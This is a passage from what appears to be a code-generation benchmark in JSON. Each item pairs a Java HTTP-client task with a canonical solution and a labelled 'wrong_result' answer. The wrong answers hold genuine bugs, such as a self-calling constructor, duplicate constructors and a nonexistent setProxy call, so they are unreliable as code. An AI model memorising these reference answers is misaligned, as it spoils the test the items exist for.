if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpGetter {\n    public static String httpGet(String requestUrl) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n            try (InputStream inputStream = conn.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, \"UTF-8\"))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests with support for proxy configuration, including making GET requests, processing responses, and handling callbacks for success and failure scenarios.\n\nClass Description: The HttpRequestManager class manages HTTP requests with configurable proxy settings. It provides functionality to make GET requests to a specified URL, process the response (including Base64 decoding), and notify the caller of success or failure through a callback interface.\n\nAttributes:\n- mProxyOn: boolean - Indicates whether proxy is enabled\n- mProxyHost: String - The host address of the proxy server\n- mProxyPort: long - The port number of the proxy server\n\nMethods:\n- HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) -> void - Constructor that initializes proxy configuration\n- requestSubscribeServerConfigs(String urlStr, Callback callback) -> void - Makes a GET request to the specified URL and processes the response, notifying through callback\n- readStringFromStream(InputStream inputStream) -> String - Helper method to read and convert an InputStream to a String\n- interface Callback - Nested interface for handling request results\n  - onSuccess(String response) -> void - Called when request succeeds\n  - onFailed() -> void - Called when request fails",
    "Canonical_solution": "import android.net.Uri;\nimport android.text.TextUtils;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Objects;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, @NonNull Callback callback) {\n        URL url;\n        try {\n            url = new URL(urlStr);\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n            callback.onFailed();\n            return;\n        }\n        HttpURLConnection connection = null;\n        try {\n            if (mProxyOn) {\n                InetSocketAddress proxyAddress = new InetSocketAddress(mProxyHost, (int) mProxyPort);\n                Proxy proxy = new Proxy(Proxy.Type.SOCKS, proxyAddress);\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.setRequestMethod(\"GET\");\n            connection.setDoInput(true);\n            connection.connect();\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpsURLConnection.HTTP_OK) {\n                callback.onFailed();\n                return;\n            }\n            try (InputStream stream = connection.getInputStream()) {\n                if (stream != null) {\n                    @Nullable String response = DecodeUtils.decodeBase64(readStringFromStream(stream));\n                    if (TextUtils.isEmpty(response)) {\n                        callback.onFailed();\n                    } else {\n                        callback.onSuccess(response);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            callback.onFailed();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        try (Reader reader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n            char[] buf = new char[4096];\n            StringBuilder sb = new StringBuilder();\n            int readSize;\n            while ((readSize = reader.read(buf)) != -1) {\n                sb.append(buf, 0, readSize);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.StringBuilder;\nimport java.net.HttpURLConnection;\nimport java.net.Proxy;\nimport java.net.InetSocketAddress;\nimport java.net.URL;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, Callback callback) {\n        try {\n            URL url = new URL(urlStr);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            if (mProxyOn) {\n                connection.setProxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(mProxyHost, mProxyPort)));\n            }\n            connection.setRequestMethod(\"GET\");\n            InputStream inputStream = connection.getInputStream();\n            String response = readStringFromStream(inputStream);\n            callback.onSuccess(response);\n        } catch (Exception e) {\n            callback.onFailed();\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        StringBuilder sb = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return sb.toString();\n    }\n\n    public static interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Implement a lightweight HTTP client class in Java that can perform GET and POST requests with configurable headers, parameters, and timeouts.\n\nClass Description: HttpTinyClient is a utility class that provides basic HTTP GET and POST functionality using Java's HttpURLConnection. It handles URL parameter encoding, header management, and response processing.\n\nAttributes:\nNone (This is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP GET request to the specified URL with given headers and parameters. Encodes parameters in the URL query string.\n\nMethod2: httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP POST request to the specified URL with given headers and parameters. Encodes parameters in the request body.\n\nMethod3: encodingParams(List<String> paramValues, String encoding) -> String - Helper method that encodes parameter values for URL or POST body using the specified character encoding.\n\nMethod4: setHeaders(HttpURLConnection conn, List<String> headers, String encoding) -> void - Helper method that sets request headers including default headers for content type and client version.\n\nNested Class: HttpResult - Represents the result of an HTTP request with status code and response content.\n\nAttributes:\ncode: int - HTTP response status code\ncontent: String - Response body content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.util.Iterator;\nimport java.util.List;\nimport org.apache.rocketmq.common.MQVersion;\nimport org.apache.rocketmq.common.MixAll;\n\npublic class HttpTinyClient {\n\n    static public HttpResult httpGet(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n        url += (null == encodedContent) ? \"\" : (\"?\" + encodedContent);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout((int) readTimeoutMs);\n            conn.setReadTimeout((int) readTimeoutMs);\n            setHeaders(conn, headers, encoding);\n\n            conn.connect();\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static private String encodingParams(List<String> paramValues, String encoding)\n        throws UnsupportedEncodingException {\n        StringBuilder sb = new StringBuilder();\n        if (null == paramValues) {\n            return null;\n        }\n\n        for (Iterator<String> iter = paramValues.iterator(); iter.hasNext(); ) {\n            sb.append(iter.next()).append(\"=\");\n            sb.append(URLEncoder.encode(iter.next(), encoding));\n            if (iter.hasNext()) {\n                sb.append(\"&\");\n            }\n        }\n        return sb.toString();\n    }\n\n    static private void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        if (null != headers) {\n            for (Iterator<String> iter = headers.iterator(); iter.hasNext(); ) {\n                conn.addRequestProperty(iter.next(), iter.next());\n            }\n        }\n        conn.addRequestProperty(\"Client-Version\", MQVersion.getVersionDesc(MQVersion.CURRENT_VERSION));\n        conn.addRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded;charset=\" + encoding);\n\n        String ts = String.valueOf(System.currentTimeMillis());\n        conn.addRequestProperty(\"Metaq-Client-RequestTS\", ts);\n    }\n\n    static public HttpResult httpPost(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            setHeaders(conn, headers, encoding);\n\n            conn.getOutputStream().write(encodedContent.getBytes(MixAll.DEFAULT_CHARSET));\n\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (null != conn) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static public class HttpResult {\n        final public int code;\n        final public String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpTinyClient {\n    private static class HttpResult {\n        int code;\n        String content;\n        \n        HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n        \n        HttpResult(int code, String errorMessage) {\n            this.code = code;\n            this.content = errorMessage;\n        }\n    }\n    \n    public static HttpResult httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            URL u = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setConnectTimeout(5000);\n            \n            setHeaders(conn, headers, encoding);\n            \n            String params = encodingParams(paramValues, encoding);\n            if (params != null && !params.isEmpty()) {\n                url += \"?\" + params;\n            }\n            \n            conn.setInstanceFollowRedirects(true);\n            conn.setRequestMethod(\"GET\");\n            \n            int code = conn.getResponseCode();\n            String content = \"\";\n            if (code == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), encoding));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    content += line;\n                }\n                reader.close();\n            } else {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), encoding));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    content += line;\n                }\n                reader.close();\n            }\n            return new HttpResult(code, content);\n        } catch (Exception e) {\n            return new HttpResult(-1, e.getMessage());\n        }\n    }\n    \n    public static HttpResult httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            URL u = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setConnectTimeout(5000);\n            \n            setHeaders(conn, headers, encoding);\n            \n            String params = encodingParams(paramValues, encoding);\n            if (params != null && !params.isEmpty()) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    os.write(params.getBytes(encoding));\n                    os.flush();\n                }\n            }\n            \n            conn.setRequestMethod(\"POST\");\n            int code = conn.getResponseCode();\n            String content = \"\";\n            if (code == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), encoding));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    content += line;\n                }\n                reader.close();\n            } else {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), encoding));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    content += line;\n                }\n                reader.close();\n            }\n            return new HttpResult(code, content);\n        } catch (Exception e) {\n            return new HttpResult(-1, e.getMessage());\n        }\n    }\n    \n    public static String encodingParams(List<String> paramValues, String encoding) {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < paramValues.size(); i++) {\n            String param = paramValues.get(i);\n            int equalsIndex = param.indexOf('=');\n            if (equalsIndex == -1) {\n                continue;\n            }\n            String key = param.substring(0, equalsIndex);\n            String value = param.substring(equalsIndex + 1);\n            try {\n                value = new String(value.getBytes(StandardCharsets.ISO_8859_1), encoding);\n            } catch (Exception e) {\n                // Handle exception, perhaps log or ignore\n            }\n            if (i > 0) {\n                sb.append(\"&\");\n            }\n            sb.append(key).append(\"=\").append(value);\n        }\n        return sb.toString();\n    }\n    \n    public static void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        conn.setRequestProperty(\"User-Agent\", \"HttpTinyClient/1.0\");\n        \n        if (\"POST\".equals(conn.getRequestMethod())) {\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        }\n        \n        if (headers != null) {\n            for (String header : headers) {\n                String[] parts = header.split(\":\");\n                if (parts.length == 2) {\n                    conn.setRequestProperty(parts[0], parts[1]);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests (GET and POST) to a REST API, with support for custom headers, query parameters, and JSON serialization/deserialization.\n\nClass Description: The ApiHandler class provides a convenient way to make HTTP requests to a REST API endpoint. It supports both GET and POST methods, handles query parameters, includes custom headers (like API keys), and automatically serializes/deserializes JSON data using Gson. The class maintains a base URL and optional additional headers that are included in every request.\n\nAttributes:\n- baseUrl: String - The base URL for all API requests\n- additionalHeaders: Map<String, String> - Optional headers to include in all requests\n\nMethods:\n- Constructor: ApiHandler(String url) - Initializes the handler with a base URL\n- Constructor: ApiHandler(String url, String apiKey) - Initializes with base URL and sets an API key header\n- get: <T> get(String endpoint, Class<T> tClass) -> T - Makes a GET request to the endpoint and returns deserialized response\n- get: <T> get(String endpoint, HashMap<String, Object> query, Class<T> tClass) -> T - Makes a GET request with query parameters\n- post: <T> post(String endpoint, T body, Class<T> tClass) -> T - Makes a POST request with a request body\n- post: <T> post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) -> T - Makes a POST request with query parameters and body\n- getRaw: static String getRaw(Map<String, String> headers, String url) -> String - Makes a raw GET request and returns response as string\n- postRaw: static String postRaw(Map<String, String> headers, String url, String body) -> String - Makes a raw POST request and returns response as string\n- addHeaders: static void addHeaders(HttpURLConnection connection, Map<String, String> headers) - Helper to add headers to a connection\n- parseQueries: static String parseQueries(HashMap<String, Object> query) -> String - Converts query parameters to URL encoded string\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) -> T - Makes GET request to full URL and deserializes response\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) -> T - GET with query params to full URL\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) -> T - POST to full URL with body\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) -> T - POST with query params to full URL\n- urlEncodeUTF8: static String urlEncodeUTF8(String input) -> String - URL encodes a string using UTF-8",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\nimport com.google.gson.Gson;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\npublic class ApiHandler {\n    public final String baseUrl;\n    public final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        baseUrl = url;\n        additionalHeaders = null;\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        baseUrl = url;\n        additionalHeaders = new ArrayMap<>();\n        additionalHeaders.put(\"x-api-key\", apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        Log.d(\"ApiHandler\", url);\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            addHeaders(conn, headers);\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            Log.d(ApiHandler.class.toString(), data);\n            inputStream.close();\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            addHeaders(conn, headers);\n            conn.setDoOutput(true);\n\n            OutputStream outputStream = conn.getOutputStream();\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            outputStream.write(input, 0, input.length);\n            outputStream.close();\n\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            inputStream.close();\n\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if(headers != null) {\n            for(String key : headers.keySet())\n                connection.addRequestProperty(key, headers.get(key));\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder params = new StringBuilder(\"?\");\n        for (String param : query.keySet()) {\n            String value = Objects.toString(query.get(param));\n            params.append(urlEncodeUTF8(param))\n                    .append(\"=\")\n                    .append(urlEncodeUTF8(value))\n                    .append(\"&\");\n        }\n        return params.substring(0, params.length() - 1);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        return new Gson().fromJson(getRaw(headers, url), tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(headers, url + parseQueries(query), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url, body.toString()), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url + parseQueries(query), body.toString()), tClass);\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        }catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 is required\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.*;\n\npublic class ApiHandler {\n    private String baseUrl;\n    private Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        this(baseUrl, apiKey);\n        additionalHeaders.put(\"Authorization\", \"Bearer \" + apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String fullUrl = baseUrl + endpoint;\n        return getFullUrl(additionalHeaders, fullUrl, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String fullUrl = baseUrl + endpoint;\n        return getFullUrl(additionalHeaders, fullUrl, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String fullUrl = baseUrl + endpoint;\n        return postFullUrl(additionalHeaders, fullUrl, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String fullUrl = baseUrl + endpoint;\n        return postFullUrl(additionalHeaders, fullUrl, query, body, tClass);\n    }\n\n    private static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        return getFullUrl(headers, url, null, tClass);\n    }\n\n    private static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String queryString = parseQueries(query);\n        if (queryString != null && !queryString.isEmpty()) {\n            url += \"?\" + queryString;\n        }\n        String response = getRaw(headers, url);\n        return gson.fromJson(response, tClass);\n    }\n\n    private static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        return postFullUrl(headers, url, null, body, tClass);\n    }\n\n    private static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException, com.google.gson.JsonSyntaxException {\n        String queryString = parseQueries(query);\n        if (queryString != null && !queryString.isEmpty()) {\n            url += \"?\" + queryString;\n        }\n        String responseBody = postRaw(headers, url, gson.toJson(body));\n        return gson.fromJson(responseBody, tClass);\n    }\n\n    private static String getRaw(Map<String, String> headers, String url) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(connection, headers);\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            InputStream inputStream = connection.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            StringBuilder response = new StringBuilder();\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                response.append(new String(buffer, 0, bytesRead, StandardCharsets.UTF_8));\n            }\n            return response.toString();\n        } else {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    private static String postRaw(Map<String, String> headers, String url, String body) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(connection, headers);\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/json; charset=UTF-8\");\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            os.write(input, 0, input.length);\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            InputStream inputStream = connection.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            StringBuilder response = new StringBuilder();\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                response.append(new String(buffer, 0, bytesRead, StandardCharsets.UTF_8));\n            }\n            return response.toString();\n        } else {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        if (query == null || query.isEmpty()) {\n            return null;\n        }\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : query.entrySet()) {\n            String key = urlEncodeUTF8(entry.getKey());\n            String value = urlEncodeUTF8(entry.getValue().toString());\n            if (sb.length() > 0) {\n                sb.append(\"&\");\n            }\n            sb.append(key).append(\"=\").append(value);\n        }\n        return sb.toString();\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"Encoding not supported\", e);\n        }\n    }\n\n    private static final Gson gson = new Gson();\n}"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Implement a Java class that provides remote service capabilities for retrieving knowledge packages from a repository server using HTTP communication.\n\nClass Description: RemoteServiceImpl is a service class that handles HTTP communication with a remote repository server to fetch knowledge packages. It manages the connection, request/response handling, and data processing.\n\nAttributes:\n- resporityServerUrl: String - The base URL of the remote repository server\n- log: Logger - Logger instance for logging information and errors\n\nMethods:\n- getKnowledge(String packageId, String timestamp) -> KnowledgePackage - Retrieves a knowledge package from the remote server using the specified package ID and timestamp\n- sendRequest(String packageId, String timestamp) -> String - Internal method that handles the HTTP request/response cycle with the remote server\n- setResporityServerUrl(String resporityServerUrl) -> void - Sets the repository server URL, appending the default endpoint if not present",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\nimport org.apache.commons.lang.StringUtils;\n\nimport com.bstek.urule.RuleException;\nimport com.bstek.urule.Utils;\nimport com.bstek.urule.model.flow.FlowDefinition;\nimport com.bstek.urule.model.rete.JsonUtils;\nimport com.bstek.urule.runtime.KnowledgePackage;\nimport com.bstek.urule.runtime.KnowledgePackageWrapper;\n\npublic class RemoteServiceImpl implements RemoteService {\n    private String resporityServerUrl;\n    private Logger log = Logger.getLogger(RemoteServiceImpl.class.getName());\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        if(StringUtils.isEmpty(resporityServerUrl)){\n            return null;\n        }\n        log.info(\"Load knowledgepackage from remote...\");\n        String content = sendRequest(packageId, timestamp);\n        if(StringUtils.isEmpty(content)){\n            return null;\n        }\n        KnowledgePackageWrapper wrapper = JsonUtils.parseKnowledgePackageWrapper(content);\n        KnowledgePackage knowledgePackage = wrapper.getKnowledgePackage();\n        Map<String, FlowDefinition> flowMap = knowledgePackage.getFlowMap();\n        if(flowMap != null && flowMap.size() > 0){\n            for(FlowDefinition fd : flowMap.values()){\n                fd.buildConnectionToNode();\n            }\n        }\n        return knowledgePackage;\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        HttpURLConnection connection = null;\n        OutputStreamWriter writer = null;\n        InputStream inputStream = null;\n        InputStreamReader inputStreamReader = null;\n        BufferedReader bufferedReader = null;\n        try {\n            packageId = Utils.encodeURL(packageId);\n            packageId = Utils.encodeURL(packageId);\n            String content = \"packageId=\" + packageId + \"\";\n            if(StringUtils.isNotEmpty(timestamp)){\n                content += \"&timestamp=\" + timestamp + \"\";\n            }\n            URL url = new URL(resporityServerUrl);\n            connection = (HttpURLConnection)url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Content-Length\", String.valueOf(content.length()));\n            connection.setUseCaches(false);\n            connection.setDoOutput(true);\n            connection.connect();\n            writer = new OutputStreamWriter(connection.getOutputStream());\n            writer.write(content);\n            writer.flush();\n            if (connection.getResponseCode() != 200) {\n                throw new RuleException(\"Server request was failed, Response message : \" + connection.getResponseMessage());\n            }\n            inputStream = connection.getInputStream();\n            inputStreamReader = new InputStreamReader(inputStream,\"utf-8\");\n            bufferedReader = new BufferedReader(inputStreamReader);\n            String line = null;\n            StringBuilder sb = new StringBuilder();\n            while ((line = bufferedReader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (Exception e) {\n            throw new RuleException(e);\n        } finally {\n            try {\n                if(writer != null){\n                    writer.close();\n                }\n                if(bufferedReader != null){\n                    bufferedReader.close();\n                }\n                if(inputStreamReader != null){\n                    inputStreamReader.close();\n                }\n                if(inputStream != null){\n                    inputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if(connection != null){\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        if(StringUtils.isEmpty(resporityServerUrl) || resporityServerUrl.equals(\"urule.resporityServerUrl\")){\n            return;\n        }\n        if(resporityServerUrl.endsWith(\"/\")){\n            resporityServerUrl += \"urule/loadknowledge\";\n        }else{\n            resporityServerUrl += \"/urule/loadknowledge\";\n        }\n        this.resporityServerUrl = resporityServerUrl;\n    }\n}",
